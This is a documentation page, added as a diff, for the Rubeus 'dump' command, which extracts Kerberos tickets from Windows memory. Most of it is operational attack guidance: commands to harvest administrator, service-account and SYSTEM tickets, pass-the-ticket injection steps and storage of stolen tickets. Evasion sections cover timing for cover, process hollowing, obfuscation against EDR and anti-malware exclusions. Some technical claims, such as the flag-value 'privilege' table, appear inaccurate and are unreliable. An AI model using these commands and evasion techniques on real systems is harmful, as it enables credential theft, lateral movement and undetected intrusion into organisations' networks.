@@ -1,0 +1,1244 @@
+---
+title: 'dump'
+description: 'Extract all current Kerberos tickets from memory'
+icon: 'download'
+sidebarTitle: 'dump'
+---
+
+<Info>
+  The `dump` command provides comprehensive Kerberos ticket extraction capabilities from system memory, supporting both targeted and bulk harvesting operations across user sessions.
+</Info>
+
+<CardGroup cols={2}>
+  <Card title="Memory Extraction" icon="memory">
+    Extract tickets directly from LSA memory structures
+  </Card>
+  <Card title="Multi-Session Support" icon="users">
+    Access tickets across all user sessions when elevated
+  </Card>
+  <Card title="Flexible Filtering" icon="filter">
+    Target specific users, services, or session IDs
+  </Card>
+  <Card title="Export Ready" icon="file-export">
+    Base64-encoded output ready for injection or analysis
+  </Card>
+</CardGroup>
+
+## Overview
+
+Extract all current Kerberos tickets from memory on the local system. This command provides comprehensive ticket harvesting capabilities, extracting both TGTs and service tickets for offline analysis and reuse.
+
+<Tabs>
+  <Tab title="Basic Syntax">
+    ```bash
+    # Basic ticket extraction
+    Rubeus.exe dump
+
+    # With filtering options
+    Rubeus.exe dump [/luid:LUID] [/user:username] [/service:servicename] [/server:servername] [/nowrap]
+    ```
+  </Tab>
+
+  <Tab title="Targeted Extraction">
+    ```bash
+    # Extract from specific session
+    Rubeus.exe dump /luid:0x12345
+
+    # Extract for specific user
+    Rubeus.exe dump /user:administrator
+
+    # Extract specific service tickets
+    Rubeus.exe dump /service:krbtgt
+    ```
+  </Tab>
+
+  <Tab title="Output Options">
+    ```bash
+    # Standard wrapped output
+    Rubeus.exe dump
+
+    # Unwrapped for easy copy/paste
+    Rubeus.exe dump /nowrap
+
+    # Combined with filtering
+    Rubeus.exe dump /service:cifs /nowrap
+    ```
+  </Tab>
+</Tabs>
+
+## Parameters
+
+<Expandable title="Session Targeting" icon="crosshairs" defaultOpen>
+  <ParamField path="luid" type="string">
+    <Expandable title="Logon Session ID Details">
+      Target specific logon session ID (requires elevation)
+
+      **Format:** Hexadecimal value (e.g., 0x3e7, 0x12345)
+
+      **Use Cases:**
+      - Extract from specific user sessions
+      - Target administrative sessions
+      - Focus on service account sessions
+
+      **Discovery:** Use `logonsession` command to enumerate available LUIDs
+    </Expandable>
+  </ParamField>
+</Expandable>
+
+<Expandable title="Content Filtering" icon="filter">
+  <ParamField path="user" type="string">
+    <Expandable title="Username Filter Details">
+      Filter tickets by username (case-insensitive)
+
+      **Examples:**
+      - `administrator` - Domain admin tickets
+      - `service_account` - Service account tickets
+      - `DESKTOP-ABC123$` - Machine account tickets
+
+      **Wildcards:** Not supported - use exact username
+    </Expandable>
+  </ParamField>
+
+  <ParamField path="service" type="string">
+    <Expandable title="Service Name Filter Details">
+      Filter tickets by service name component
+
+      **Common Services:**
+      - `krbtgt` - Ticket Granting Tickets (TGTs)
+      - `cifs` - File sharing services
+      - `http` - Web services
+      - `ldap` - Directory services
+      - `mssqlsvc` - SQL Server services
+      - `host` - Host-based services
+
+      **Matching:** Partial string matching supported
+    </Expandable>
+  </ParamField>
+
+  <ParamField path="server" type="string">
+    <Expandable title="Server Name Filter Details">
+      Filter tickets by target server name
+
+      **Examples:**
+      - `dc01.corp.local` - Domain controller tickets
+      - `fileserver.corp.local` - File server tickets
+      - `sql01` - Database server tickets
+
+      **FQDN Support:** Both short and fully qualified names
+    </Expandable>
+  </ParamField>
+</Expandable>
+
+<Expandable title="Output Formatting" icon="file-text">
+  <ParamField path="nowrap" type="boolean">
+    <Expandable title="Base64 Output Formatting">
+      Controls base64 encoding output format
+
+      **Default Behavior:** Base64 output wrapped at 76 characters
+      **With /nowrap:** Single-line base64 output
+
+      **Benefits of /nowrap:**
+      - Easier copy/paste operations
+      - Direct injection compatibility
+      - Simplified scripting integration
+
+      **Trade-offs:** Less readable in terminal output
+    </Expandable>
+  </ParamField>
+</Expandable>
+
+<Tabs>
+  <Tab title="Basic Operations">
+    <CodeGroup>
+    ```bash Standard Extraction
+    # Dump all tickets for current user
+    Rubeus.exe dump
+
+    # System-wide extraction (elevated)
+    Rubeus.exe dump
+
+    # Unwrapped output for injection
+    Rubeus.exe dump /nowrap
+    ```
+
+    ```bash Quick Assessment
+    # Count available tickets
+    Rubeus.exe dump | findstr "[*] Action"
+
+    # Extract only TGTs for overview
+    Rubeus.exe dump /service:krbtgt
+
+    # Focus on current session
+    Rubeus.exe dump /luid:0x3e7
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="Targeted Extraction">
+    <CodeGroup>
+    ```bash User-Specific
+    # Administrative accounts
+    Rubeus.exe dump /user:administrator
+    Rubeus.exe dump /user:"domain admin"
+
+    # Service accounts
+    Rubeus.exe dump /user:sqlservice
+    Rubeus.exe dump /user:iisapppool
+
+    # Machine accounts
+    Rubeus.exe dump /user:"DESKTOP-ABC$"
+    ```
+
+    ```bash Service-Specific
+    # File sharing services
+    Rubeus.exe dump /service:cifs
+
+    # Web services
+    Rubeus.exe dump /service:http
+
+    # Directory services
+    Rubeus.exe dump /service:ldap
+
+    # Database services
+    Rubeus.exe dump /service:mssqlsvc
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="Server Targeting">
+    <CodeGroup>
+    ```bash Infrastructure Servers
+    # Domain controllers
+    Rubeus.exe dump /server:dc01.corp.local
+    Rubeus.exe dump /server:pdc.corp.local
+
+    # File servers
+    Rubeus.exe dump /server:fileserver.corp.local
+    Rubeus.exe dump /server:shares.corp.local
+
+    # Application servers
+    Rubeus.exe dump /server:sql01.corp.local
+    Rubeus.exe dump /server:web01.corp.local
+    ```
+
+    ```bash Combined Filtering
+    # Specific user + service
+    Rubeus.exe dump /user:administrator /service:cifs
+
+    # Service + server combination
+    Rubeus.exe dump /service:ldap /server:dc01.corp.local
+
+    # Complete targeting
+    Rubeus.exe dump /luid:0x12345 /service:krbtgt /nowrap
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="Session Management">
+    <CodeGroup>
+    ```bash LUID-Based Extraction
+    # System session (common LUIDs)
+    Rubeus.exe dump /luid:0x3e7     # SYSTEM
+    Rubeus.exe dump /luid:0x3e4     # NETWORK SERVICE
+    Rubeus.exe dump /luid:0x3e5     # LOCAL SERVICE
+
+    # User sessions (discovered via logonsession)
+    Rubeus.exe dump /luid:0x12345   # Interactive user
+    Rubeus.exe dump /luid:0x67890   # Service logon
+    ```
+
+    ```bash Discovery + Extraction
+    # First discover sessions
+    Rubeus.exe logonsession
+
+    # Then extract from interesting LUIDs
+    Rubeus.exe dump /luid:0x[DISCOVERED_LUID]
+
+    # Extract and prepare for injection
+    Rubeus.exe dump /luid:0x[TARGET] /nowrap
+    ```
+    </CodeGroup>
+  </Tab>
+</Tabs>
+
+<Tabs>
+  <Tab title="Standard User">
+    <Frame>
+      <CardGroup cols={2}>
+        <Card title="Available Operations" icon="check" color="#22c55e">
+          - Extract current user tickets
+          - Access current LUID only
+          - View authenticated services
+          - Export for analysis
+        </Card>
+        <Card title="Limitations" icon="x" color="#ef4444">
+          - No other user sessions
+          - No cross-LUID access
+          - No system tickets
+          - Limited session scope
+        </Card>
+      </CardGroup>
+    </Frame>
+
+    **Typical Extraction Scope:**
+    - User's TGT (krbtgt ticket)
+    - Service tickets for accessed resources
+    - Cached authentication tickets
+    - Current session credentials only
+
+    **Use Cases:**
+    - Personal credential analysis
+    - Current session assessment
+    - Individual ticket extraction
+    - Basic reconnaissance
+  </Tab>
+
+  <Tab title="Elevated Context">
+    <Frame>
+      <CardGroup cols={2}>
+        <Card title="Enhanced Capabilities" icon="crown" color="#3b82f6">
+          - All user sessions access
+          - Cross-LUID extraction
+          - System-wide harvesting
+          - Service account tickets
+        </Card>
+        <Card title="Additional Access" icon="key" color="#8b5cf6">
+          - Machine account tickets
+          - Administrative sessions
+          - System service tickets
+          - Network service credentials
+        </Card>
+      </CardGroup>
+    </Frame>
+
+    **Expanded Extraction Scope:**
+    - All logged-on user tickets
+    - Service account credentials
+    - Machine account tickets (COMPUTER$)
+    - System service tickets
+    - Administrative session tickets
+    - Network service credentials
+
+    **Advanced Use Cases:**
+    - Comprehensive ticket harvesting
+    - Multi-user environment analysis
+    - Service account discovery
+    - Domain-wide credential mapping
+  </Tab>
+
+  <Tab title="SYSTEM Context">
+    <Info>
+      Running as SYSTEM provides maximum ticket extraction capabilities
+    </Info>
+
+    **Exclusive Capabilities:**
+    - Access to all LSA secrets
+    - Machine account ticket extraction
+    - System service credentials
+    - Network authentication tickets
+    - Cached domain credentials
+
+    **Special Ticket Types:**
+    - COMPUTER$ machine account TGTs
+    - IIS application pool tickets
+    - SQL Server service tickets
+    - Exchange service credentials
+    - Backup service tickets
+  </Tab>
+</Tabs>
+
+<Tabs>
+  <Tab title="Ticket Granting Tickets">
+    <CardGroup cols={2}>
+      <Card title="TGT Characteristics" icon="ticket">
+        **Service Pattern:** `krbtgt/DOMAIN.COM`
+
+        **Properties:**
+        - Domain authentication proof
+        - Service ticket request capability
+        - Renewable based on policy
+        - Session-specific encryption
+      </Card>
+      <Card title="Attack Value" icon="crosshairs">
+        **Capabilities:**
+        - Request any domain service
+        - Enable lateral movement
+        - Support golden ticket creation
+        - Facilitate pass-the-ticket
+      </Card>
+    </CardGroup>
+
+    <Expandable title="TGT Analysis Details" defaultOpen>
+      **Encryption Information:**
+      - AES256/AES128 in modern environments
+      - RC4 in legacy or downgraded scenarios
+      - Key derived from user password/hash
+
+      **Validity Periods:**
+      - Default: 10 hours (configurable)
+      - Renewable: Up to 7 days (default)
+      - Maximum lifetime: Domain policy dependent
+
+      **Usage Patterns:**
+      - One TGT per authentication session
+      - Automatically renewed by Windows
+      - Cached until session termination
+    </Expandable>
+  </Tab>
+
+  <Tab title="Service Tickets">
+    <CardGroup cols={3}>
+      <Card title="File Services" icon="folder">
+        **CIFS/SMB Tickets:**
+        - `cifs/server.domain.com`
+        - File share access
+        - UNC path authentication
+        - Network drive mapping
+      </Card>
+      <Card title="Web Services" icon="globe">
+        **HTTP/HTTPS Tickets:**
+        - `http/server.domain.com`
+        - Web application access
+        - IIS authentication
+        - SharePoint/Exchange
+      </Card>
+      <Card title="Directory Services" icon="sitemap">
+        **LDAP Tickets:**
+        - `ldap/dc.domain.com`
+        - Active Directory queries
+        - Group membership checks
+        - Administrative tools
+      </Card>
+    </CardGroup>
+
+    <Expandable title="Additional Service Types">
+      **Database Services:**
+      - `mssqlsvc/sql.domain.com:1433` - SQL Server
+      - `oracle/db.domain.com` - Oracle Database
+      - `mysql/db.domain.com` - MySQL
+
+      **Infrastructure Services:**
+      - `host/server.domain.com` - Generic host services
+      - `rpcss/server.domain.com` - RPC services
+      - `dns/server.domain.com` - DNS services
+
+      **Specialized Services:**
+      - `exchangemdb/mail.domain.com` - Exchange
+      - `sharepoint/sp.domain.com` - SharePoint
+      - `ftp/ftp.domain.com` - FTP services
+    </Expandable>
+
+    <Expandable title="Attack Applications">
+      **Direct Access:**
+      - Use tickets for immediate service access
+      - Bypass authentication mechanisms
+      - Access resources without credentials
+
+      **Silver Ticket Creation:**
+      - Extract service principal information
+      - Use as template for forged tickets
+      - Analyze encryption and flags
+
+      **Lateral Movement:**
+      - Map service relationships
+      - Identify accessible resources
+      - Plan movement paths
+    </Expandable>
+  </Tab>
+
+  <Tab title="Special Tickets">
+    <Warning>
+      Some ticket types provide elevated privileges or unique capabilities
+    </Warning>
+
+    **Machine Account Tickets:**
+    - `krbtgt/DOMAIN.COM` for COMPUTER$ accounts
+    - Inter-domain trust relationships
+    - System service authentication
+    - DCSync and other privileged operations
+
+    **Delegation Tickets:**
+    - Constrained delegation tickets
+    - Unconstrained delegation tickets
+    - Resource-based constrained delegation
+    - Protocol transition tickets
+
+    **Administrative Tickets:**
+    - Domain admin TGTs
+    - Enterprise admin tickets
+    - Schema admin credentials
+    - Backup operator tickets
+  </Tab>
+</Tabs>
+
+<Tabs>
+  <Tab title="Output Structure">
+    <ResponseField name="Action Header" type="string">
+      Indicates the operation being performed
+
+      **Examples:**
+      - `[*] Action: Dump Kerberos tickets (Current User)`
+      - `[*] Action: Dump Kerberos tickets (All Users)`
+      - `[*] Action: Dump Kerberos tickets (LUID: 0x12345)`
+    </ResponseField>
+
+    <ResponseField name="Current LUID" type="hex">
+      Current process logon session identifier
+
+      **Format:** `[*] Current LUID : 0x[hexvalue]`
+
+      **Common Values:**
+      - `0x3e7` - SYSTEM session
+      - `0x3e4` - NETWORK SERVICE
+      - `0x3e5` - LOCAL SERVICE
+    </ResponseField>
+
+    <ResponseField name="Session Information" type="object">
+      **Authentication Details:**
+      - `UserName` - Account name (user, computer, service)
+      - `Domain` - Authentication domain
+      - `LogonId` - Session identifier (matches LUID)
+      - `UserSID` - Security identifier
+      - `AuthenticationPackage` - Kerberos, NTLM, etc.
+      - `LogonType` - Interactive, Service, Network, etc.
+      - `LogonTime` - Session establishment time
+      - `LogonServer` - Authenticating domain controller
+      - `LogonServerDNSDomain` - Domain FQDN
+      - `UserPrincipalName` - UPN if available
+    </ResponseField>
+  </Tab>
+
+  <Tab title="Ticket Metadata">
+    <ResponseField name="Ticket Index" type="number">
+      Sequential ticket number within session
+
+      **Format:** `[0]`, `[1]`, `[2]`, etc.
+    </ResponseField>
+
+    <ResponseField name="Encryption Type" type="hex">
+      Kerberos encryption algorithm identifier
+
+      **Common Values:**
+      - `0x12` - AES256-CTS-HMAC-SHA1-96
+      - `0x11` - AES128-CTS-HMAC-SHA1-96
+      - `0x17` - RC4-HMAC-MD5
+      - `0x03` - DES-CBC-MD5 (legacy)
+    </ResponseField>
+
+    <ResponseField name="Validity Period" type="datetime">
+      Ticket timing information
+
+      **Format:** `Start/End/MaxRenew: [start] ; [end] ; [maxrenew]`
+
+      **Components:**
+      - Start time - When ticket becomes valid
+      - End time - When ticket expires
+      - Max renew - Latest possible renewal time
+    </ResponseField>
+
+    <ResponseField name="Principal Names" type="string">
+      Service and client identification
+
+      **Server Name:** Target service principal
+      - Format: `service/hostname@REALM`
+      - Example: `krbtgt/CORP.LOCAL @ CORP.LOCAL`
+
+      **Client Name:** Requesting principal
+      - Format: `username@REALM`
+      - Example: `user @ CORP.LOCAL`
+    </ResponseField>
+  </Tab>
+
+  <Tab title="Sample Output">
+    <Frame>
+    ```text Complete Dump Example
+    [*] Action: Dump Kerberos tickets (All Users)
+
+    [*] Current LUID    : 0x3e7
+
+       UserName                 : DESKTOP-ABC123$
+       Domain                   : CORP
+       LogonId                  : 0x3e7
+       UserSID                  : S-1-5-18
+       AuthenticationPackage    : Kerberos
+       LogonType                : Service
+       LogonTime                : 1/15/2024 9:15:32 AM
+       LogonServer              :
+       LogonServerDNSDomain     : CORP.LOCAL
+       UserPrincipalName        :
+
+          [0] - 0x12 - aes256_cts_hmac_sha1
+            Start/End/MaxRenew: 1/15/2024 9:15:32 AM ; 1/15/2024 7:15:32 PM ; 1/22/2024 9:15:32 AM
+            Server Name       : krbtgt/CORP.LOCAL @ CORP.LOCAL
+            Client Name       : DESKTOP-ABC123$ @ CORP.LOCAL
+            Flags             : name_canonicalize, pre_authent, renewable, forwarded, forwardable (40a10000)
+
+            doIFujCCBbagAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQwbCkNPUlAuTE9DQUw...
+
+          [1] - 0x12 - aes256_cts_hmac_sha1
+            Start/End/MaxRenew: 1/15/2024 9:16:15 AM ; 1/15/2024 7:15:32 PM ; 1/22/2024 9:15:32 AM
+            Server Name       : cifs/fileserver.corp.local @ CORP.LOCAL
+            Client Name       : DESKTOP-ABC123$ @ CORP.LOCAL
+            Flags             : name_canonicalize, pre_authent, renewable, forwarded, forwardable (40a10000)
+
+            doIFrjCCBaqgAwIBBaEDAgEWooIEnjCCBJphggSWMIIEkqADAgEFoQwbCkNPUlAuTE9DQUw...
+    ```
+    </Frame>
+  </Tab>
+
+  <Tab title="Flag Analysis">
+    <Expandable title="Ticket Flags Interpretation" defaultOpen>
+      <ResponseField name="Common Flag Values" type="hex">
+        **Standard Patterns:**
+        - `40a10000` - Standard user TGT (renewable, forwardable)
+        - `40e10000` - Administrative TGT (additional privileges)
+        - `50a10000` - Delegation-enabled ticket
+        - `60a10000` - Highly privileged ticket
+      </ResponseField>
+
+      **Flag Breakdown:**
+      - `renewable` - Can be renewed before expiration
+      - `forwardable` - Can be forwarded to other services
+      - `forwarded` - Has been forwarded from another ticket
+      - `proxiable` - Can be used for proxy authentication
+      - `proxy` - Is a proxy ticket
+      - `may_postdate` - Can be post-dated
+      - `postdated` - Is post-dated
+      - `invalid` - Ticket is invalid
+      - `revokable` - Can be revoked
+      - `trusted_for_delegation` - Trusted for delegation
+      - `name_canonicalize` - Name canonicalization allowed
+      - `pre_authent` - Pre-authentication completed
+    </Expandable>
+  </Tab>
+</Tabs>
+
+<Steps>
+  <Step title="Encryption Analysis">
+    <Tabs>
+      <Tab title="Modern Encryption">
+        <CardGroup cols={2}>
+          <Card title="AES256" icon="lock" color="#22c55e">
+            **Type:** `0x12` - AES256-CTS-HMAC-SHA1-96
+
+            **Characteristics:**
+            - Strongest available encryption
+            - Default in modern domains
+            - FIPS 140-2 compliant
+            - Preferred for security
+          </Card>
+          <Card title="AES128" icon="shield-halved" color="#3b82f6">
+            **Type:** `0x11` - AES128-CTS-HMAC-SHA1-96
+
+            **Characteristics:**
+            - Strong encryption standard
+            - Widely supported
+            - Good performance balance
+            - Acceptable for most environments
+          </Card>
+        </CardGroup>
+      </Tab>
+
+      <Tab title="Legacy Encryption">
+        <Warning>
+          Legacy encryption types may indicate security weaknesses or attack opportunities
+        </Warning>
+
+        <CardGroup cols={2}>
+          <Card title="RC4" icon="exclamation-triangle" color="#f59e0b">
+            **Type:** `0x17` - RC4-HMAC-MD5
+
+            **Risks:**
+            - Weaker encryption algorithm
+            - Vulnerable to certain attacks
+            - May indicate legacy systems
+            - Possible downgrade attack
+          </Card>
+          <Card title="DES" icon="ban" color="#ef4444">
+            **Type:** `0x03` - DES-CBC-MD5
+
+            **Critical Issues:**
+            - Extremely weak encryption
+            - Easily crackable
+            - Legacy system indicator
+            - Security vulnerability
+          </Card>
+        </CardGroup>
+      </Tab>
+    </Tabs>
+  </Step>
+
+  <Step title="Timing Analysis">
+    **Validity Period Assessment:**
+    - Compare start/end times for anomalies
+    - Check for unusually long durations
+    - Identify renewable vs. non-renewable tickets
+    - Look for post-dated or future tickets
+
+    **Renewal Patterns:**
+    - Standard TGT: 10 hours validity, 7 days renewable
+    - Service tickets: 10 hours validity, not renewable
+    - Anomalous patterns may indicate attacks
+  </Step>
+
+  <Step title="Principal Analysis">
+    **Service Principal Patterns:**
+    - `krbtgt/*` - Ticket Granting Tickets
+    - `cifs/*` - File sharing access
+    - `host/*` - General host services
+    - `http/*` - Web service access
+    - Custom SPNs for specialized services
+
+    **Client Principal Assessment:**
+    - User accounts: `username@DOMAIN`
+    - Machine accounts: `COMPUTER$@DOMAIN`
+    - Service accounts: `service@DOMAIN`
+  </Step>
+
+  <Step title="Flag Interpretation">
+    <Expandable title="Flag Analysis Matrix" defaultOpen>
+      | Flag Value | Type | Delegation | Renewable | Forwardable | Risk Level |
+      |------------|------|------------|-----------|-------------|------------|
+      | 40a10000 | Standard | No | Yes | Yes | Low |
+      | 40e10000 | Elevated | No | Yes | Yes | Medium |
+      | 50a10000 | Delegation | Yes | Yes | Yes | High |
+      | 60a10000 | Privileged | Advanced | Yes | Yes | Critical |
+    </Expandable>
+  </Step>
+</Steps>
+
+<Tabs>
+  <Tab title="Pass-the-Ticket">
+    <Steps>
+      <Step title="TGT Extraction & Reuse">
+        <CodeGroup>
+        ```bash TGT Extraction
+        # Extract all TGTs with clean output
+        Rubeus.exe dump /service:krbtgt /nowrap
+
+        # Extract from specific user session
+        Rubeus.exe dump /user:administrator /service:krbtgt /nowrap
+
+        # Extract from elevated session
+        Rubeus.exe dump /luid:0x12345 /service:krbtgt /nowrap
+        ```
+
+        ```bash TGT Injection
+        # Inject extracted TGT
+        Rubeus.exe ptt /ticket:[BASE64_TGT]
+
+        # Verify injection success
+        Rubeus.exe klist
+
+        # Test domain access
+        dir \\dc01.corp.local\c$
+        ```
+        </CodeGroup>
+      </Step>
+
+      <Step title="Service Ticket Reuse">
+        <CodeGroup>
+        ```bash Service Extraction
+        # Extract specific service tickets
+        Rubeus.exe dump /service:cifs /server:fileserver.corp.local /nowrap
+        Rubeus.exe dump /service:http /server:web01.corp.local /nowrap
+        Rubeus.exe dump /service:ldap /server:dc01.corp.local /nowrap
+        ```
+
+        ```bash Direct Access
+        # Inject service ticket
+        Rubeus.exe ptt /ticket:[BASE64_SERVICE_TICKET]
+
+        # Access target service directly
+        net use \\fileserver.corp.local\share
+        powershell -c "Invoke-WebRequest http://web01.corp.local"
+        ```
+        </CodeGroup>
+      </Step>
+
+      <Step title="Cross-Session Operations">
+        <Info>
+          Combine dump with session management for advanced scenarios
+        </Info>
+
+        ```bash
+        # Create new session context
+        Rubeus.exe createnetonly /program:cmd.exe
+
+        # Extract tickets from source session
+        Rubeus.exe dump /luid:0x[source] /nowrap
+
+        # Inject into new session
+        Rubeus.exe ptt /ticket:[BASE64] /luid:0x[target]
+        ```
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Intelligence Gathering">
+    <Steps>
+      <Step title="Service Discovery">
+        **Analyze extracted tickets to map:**
+        - Accessible file shares (cifs tickets)
+        - Web applications (http tickets)
+        - Database servers (mssqlsvc tickets)
+        - Administrative interfaces (ldap tickets)
+
+        ```bash
+        # Extract all service tickets for analysis
+        Rubeus.exe dump | findstr "Server Name"
+        ```
+      </Step>
+
+      <Step title="Privilege Assessment">
+        **Evaluate ticket privileges:**
+        - Administrative account indicators
+        - Delegation capabilities
+        - Service account access
+        - Cross-domain relationships
+
+        **Key Indicators:**
+        - Multiple krbtgt tickets (admin access)
+        - Delegation flags in tickets
+        - High-privilege service access
+        - Machine account tickets
+      </Step>
+
+      <Step title="Infrastructure Mapping">
+        **Build network topology from tickets:**
+        - Domain controllers (krbtgt, ldap services)
+        - File servers (cifs services)
+        - Application servers (http, mssqlsvc)
+        - Infrastructure relationships
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Persistence & Evasion">
+    <Steps>
+      <Step title="Ticket Harvesting Strategy">
+        <CardGroup cols={2}>
+          <Card title="Selective Extraction" icon="target">
+            Focus on high-value tickets:
+            - Administrative TGTs
+            - Service account credentials
+            - Cross-domain tickets
+            - Delegation-enabled tickets
+          </Card>
+          <Card title="Timing Considerations" icon="clock">
+            Optimize extraction timing:
+            - Business hours for cover
+            - After authentication events
+            - Before ticket expiration
+            - During system maintenance
+          </Card>
+        </CardGroup>
+      </Step>
+
+      <Step title="Storage & Management">
+        ```bash
+        # Export tickets for offline storage
+        Rubeus.exe dump /nowrap > tickets.txt
+
+        # Organize by user/service
+        Rubeus.exe dump /user:admin /nowrap > admin_tickets.txt
+        Rubeus.exe dump /service:cifs /nowrap > file_tickets.txt
+
+        # Prepare for injection scripts
+        Rubeus.exe dump /service:krbtgt /nowrap | findstr "doIF" > tgts.txt
+        ```
+      </Step>
+
+      <Step title="Operational Rotation">
+        **Ticket Lifecycle Management:**
+        - Regular extraction before expiration
+        - Rotation of injected tickets
+        - Cleanup of expired credentials
+        - Renewal of high-value tickets
+      </Step>
+    </Steps>
+  </Tab>
+</Tabs>
+
+<Tabs>
+  <Tab title="Detection Vectors">
+    <Warning>
+      Rubeus dump operations can trigger multiple detection mechanisms
+    </Warning>
+
+    <Expandable title="API-Level Detection" icon="code" defaultOpen>
+      **Critical API Calls:**
+      - `LsaCallAuthenticationPackage()` - Primary ticket access
+      - `LsaEnumerateLogonSessions()` - Session enumeration
+      - `LsaGetLogonSessionData()` - Session information
+      - `OpenProcess()` - Process access for elevation
+
+      **Detection Signatures:**
+      - Non-LSASS processes calling LSA functions
+      - Rapid sequence of authentication package calls
+      - Cross-session ticket access patterns
+      - Elevated privilege escalation attempts
+    </Expandable>
+
+    <Expandable title="Behavioral Analysis" icon="chart-line">
+      **Suspicious Patterns:**
+      - Bulk ticket extraction from multiple sessions
+      - Enumeration of all logon sessions
+      - Access to tickets outside normal scope
+      - Extraction during off-hours or maintenance
+
+      **Process Monitoring:**
+      - Parent-child process relationships
+      - Command-line argument analysis
+      - Network activity correlation
+      - File system interaction patterns
+    </Expandable>
+
+    <Expandable title="Host-Based Indicators" icon="desktop">
+      **System-Level Detection:**
+      - Memory access to LSA structures
+      - Registry access patterns
+      - Event log generation patterns
+      - Anti-malware behavioral detection
+
+      **Windows Event Logs:**
+      - Security log entries for logon sessions
+      - Audit policy dependent events
+      - Authentication package usage
+      - Privilege use auditing
+    </Expandable>
+  </Tab>
+
+  <Tab title="Evasion Strategies">
+    <Steps>
+      <Step title="Targeted Operations">
+        <CardGroup cols={2}>
+          <Card title="Selective Targeting" icon="crosshairs">
+            **Focus Approach:**
+            - Extract specific high-value tickets only
+            - Avoid system-wide bulk harvesting
+            - Target known valuable sessions
+            - Minimize unnecessary enumeration
+          </Card>
+          <Card title="Filtered Extraction" icon="filter">
+            **Precision Techniques:**
+            - Use specific user filters
+            - Target individual services
+            - Focus on single LUIDs
+            - Avoid wildcard operations
+          </Card>
+        </CardGroup>
+
+        ```bash
+        # Good: Targeted extraction
+        Rubeus.exe dump /user:administrator /service:krbtgt
+
+        # Avoid: Bulk harvesting
+        Rubeus.exe dump
+        ```
+      </Step>
+
+      <Step title="Timing & Context">
+        **Operational Windows:**
+        - Execute during business hours
+        - Coincide with legitimate authentication
+        - Follow normal user activity patterns
+        - Avoid maintenance windows
+
+        **Environmental Blending:**
+        - Use after legitimate logon events
+        - Execute from expected user contexts
+        - Maintain normal process hierarchies
+        - Minimize detection surface
+      </Step>
+
+      <Step title="Technical Evasion">
+        **Process Management:**
+        - Run from legitimate parent processes
+        - Use process hollowing or injection
+        - Implement reflective loading
+        - Avoid disk-based execution
+
+        **Memory Considerations:**
+        - Minimize memory footprint
+        - Clean up after extraction
+        - Avoid persistent modifications
+        - Use in-memory only operations
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Defensive Countermeasures">
+    <Info>
+      Understanding defensive capabilities helps in operational planning
+    </Info>
+
+    <Expandable title="EDR/XDR Detection" defaultOpen>
+      **Common Detection Methods:**
+      - API hooking and monitoring
+      - Process behavior analysis
+      - Memory pattern recognition
+      - Machine learning anomaly detection
+
+      **Evasion Considerations:**
+      - Research specific EDR capabilities
+      - Test in isolated environments
+      - Use custom compilation/obfuscation
+      - Implement delays and jitter
+    </Expandable>
+
+    <Expandable title="Network Monitoring">
+      **Detection Capabilities:**
+      - Unusual Kerberos traffic patterns
+      - Cross-network ticket usage
+      - Authentication timing analysis
+      - Protocol anomaly detection
+
+      **Mitigation Strategies:**
+      - Use extracted tickets locally
+      - Minimize cross-network activity
+      - Blend with normal traffic
+      - Avoid suspicious timing patterns
+    </Expandable>
+
+    <Expandable title="Domain Controller Logging">
+      **Audit Capabilities:**
+      - Authentication event logging
+      - Ticket request monitoring
+      - Privilege use auditing
+      - Account logon tracking
+
+      **Operational Awareness:**
+      - Understand audit policy settings
+      - Plan for log analysis delays
+      - Consider log retention periods
+      - Account for SIEM integration
+    </Expandable>
+  </Tab>
+</Tabs>
+
+<Tabs>
+  <Tab title="Access Issues">
+    <Steps>
+      <Step title="Privilege Problems">
+        **Symptoms:**
+        - "Access Denied" errors
+        - Empty output despite tickets existing
+        - LUID enumeration failures
+
+        **Diagnosis:**
+        ```bash
+        # Check current privileges
+        whoami /priv
+
+        # Test with current user context
+        Rubeus.exe dump
+
+        # Verify LUID accessibility
+        Rubeus.exe logonsession
+        ```
+
+        **Solutions:**
+        - Run from elevated context
+        - Use appropriate user session
+        - Check process integrity level
+        - Verify SeDebugPrivilege
+      </Step>
+
+      <Step title="Anti-Malware Interference">
+        **Common Indicators:**
+        - Process termination
+        - API call blocking
+        - Memory access failures
+        - Behavioral detection alerts
+
+        **Mitigation Approaches:**
+        - Use process exclusions
+        - Implement custom obfuscation
+        - Modify compilation parameters
+        - Use alternative execution methods
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Data Issues">
+    <Steps>
+      <Step title="No Tickets Found">
+        **Root Causes:**
+        - User not authenticated to domain
+        - Tickets expired or manually purged
+        - Incorrect filtering parameters
+        - Network authentication not performed
+
+        **Troubleshooting:**
+        ```bash
+        # Check authentication status
+        Rubeus.exe klist
+
+        # Verify domain connectivity
+        nltest /dsgetdc:domain.com
+
+        # Test without filters
+        Rubeus.exe dump
+
+        # Check specific LUID
+        Rubeus.exe dump /luid:0x3e7
+        ```
+      </Step>
+
+      <Step title="Parsing Errors">
+        **Common Problems:**
+        - Corrupted ticket data in memory
+        - Unsupported encryption algorithms
+        - LSA subsystem inconsistencies
+        - Memory layout changes
+
+        **Resolution Steps:**
+        1. Restart authentication services
+        2. Clear and regenerate tickets
+        3. Verify system integrity
+        4. Update Rubeus version
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Output Issues">
+    <Steps>
+      <Step title="Formatting Problems">
+        **Symptoms:**
+        - Truncated base64 output
+        - Encoding issues
+        - Missing ticket sections
+        - Garbled characters
+
+        **Solutions:**
+        ```bash
+        # Use nowrap for clean output
+        Rubeus.exe dump /nowrap
+
+        # Redirect to file
+        Rubeus.exe dump > output.txt
+
+        # Focus on specific tickets
+        Rubeus.exe dump /service:krbtgt /nowrap
+        ```
+      </Step>
+
+      <Step title="Performance Issues">
+        **Optimization Strategies:**
+        - Use specific filters to reduce scope
+        - Target individual LUIDs
+        - Avoid system-wide enumeration
+        - Implement operational delays
+
+        **Targeted Operations:**
+        ```bash
+        # Efficient targeted extraction
+        Rubeus.exe dump /user:administrator /service:krbtgt
+        Rubeus.exe dump /luid:0x12345 /nowrap
+        ```
+      </Step>
+    </Steps>
+  </Tab>
